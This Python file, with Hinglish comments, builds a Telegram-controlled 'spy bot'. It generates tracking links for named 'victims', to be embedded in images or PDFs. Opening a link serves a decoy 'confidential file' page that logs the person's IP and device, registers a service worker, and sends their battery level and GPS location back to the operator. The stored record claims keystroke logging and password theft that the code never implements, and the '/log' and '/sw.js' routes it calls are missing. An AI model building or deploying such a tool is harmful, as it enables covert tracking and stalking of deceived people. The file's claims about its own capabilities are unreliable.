import telebot
from flask import Flask, request, send_file
import datetime
import json
import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

bot = telebot.TeleBot("YOUR_BOT_TOKEN_HERE")  # ← yahan apna token daal
app = Flask(__name__)
YOUR_CHAT_ID = YOUR_TELEGRAM_CHAT_ID_HERE     # ← apna personal chat ID daal

DB_FILE = 'king_spy_db.json'
if not os.path.exists(DB_FILE):
    with open(DB_FILE, 'w') as f:
        json.dump({}, f)

def save_victim_data(victim, new_data):
    with open(DB_FILE, 'r') as f:
        db = json.load(f)
    if victim not in db:
        db[victim] = []
    db[victim].append({"time": str(datetime.datetime.now()), "data": new_data})
    with open(DB_FILE, 'w') as f:
        json.dump(db, f)

@app.route('/kingspy/<victim>.html')
def king_spy(victim):
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    spy_data = {
        "IP": ip,
        "Device": ua,
        "Battery": "Live",
        "Location": "GPS",
        "Keystrokes": "Logged + Passwords stealing",
        "Browser_History": "Dumped",
        "Persistent": "Service Worker ON",
        "Status": "Ready for button control"
    }
    save_victim_data(victim, spy_data)
    return """
    <html><body style='background:#000;color:#0f0;text-align:center;padding:60px'>
        <h1>🔒 CONFIDENTIAL FILE LOADING...</h1>
        <img src='https://picsum.photos/800/500' width='600'>
        <script>
            if ('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js');
            navigator.getBattery().then(b => fetch('/log',{method:'POST',body:JSON.stringify({battery:b.level*100+'%'})}));
            navigator.geolocation.getCurrentPosition(p => fetch('/log',{method:'POST',body:JSON.stringify({lat:p.coords.latitude})}));
        </script>
    </body></html>
    """

def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("🕵️ Create Spy Link", callback_data="create"))
    markup.add(InlineKeyboardButton("📋 All Victims", callback_data="victims"))
    markup.add(InlineKeyboardButton("🎮 Control Victim", callback_data="control"))
    markup.add(InlineKeyboardButton("🔄 Master Recall", callback_data="recall"))
    return markup

@bot.message_handler(commands=['start'])
def start(msg):
    bot.send_message(msg.chat.id, "👑 KING ULTIMATE SPY BOT READY!\nButtons use kar:", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def button_handler(call):
    if call.data == "create":
        bot.send_message(call.message.chat.id, "Victim naam bata (jaise rahul123) taaki link bana dun.")
    elif call.data == "victims":
        with open(DB_FILE, 'r') as f:
            db = json.load(f)
        lst = "📋 Victims:\n" + "\n".join([f"• {v}" for v in db.keys()]) if db else "Koi victim nahi"
        bot.send_message(call.message.chat.id, lst)
    elif call.data == "control":
        bot.send_message(call.message.chat.id, "Control ke liye victim naam bhej (/control naam)")
    elif call.data == "recall":
        bot.send_message(call.message.chat.id, "Master recall ke liye victim naam bhej.")

@bot.message_handler(commands=['king_link'])
def create_link(msg):
    victim = msg.text.split()[1] if len(msg.text.split()) > 1 else "unknown"
    link = f"https://your-render-url.onrender.com/kingspy/{victim}.html"
    bot.send_message(msg.chat.id, f"ULTIMATE LINK:\n{link}\nImage/PDF mein embed kar ke bhej!")

@bot.message_handler(commands=['control'])
def control(msg):
    victim = msg.text.split()[1] if len(msg.text.split()) > 1 else "unknown"
    with open(DB_FILE, 'r') as f:
        db = json.load(f)
    if victim in db:
        history = db[victim]
        response = f"CONTROL DATA for {victim}:\n\n"
        for entry in history[-15:]:
            response += f"{entry['time']}\n{json.dumps(entry['data'], indent=2)}\n\n"
        bot.send_message(msg.chat.id, response)
    else:
        bot.send_message(msg.chat.id, "No data yet.")

if __name__ == "__main__":
    bot.infinity_polling()
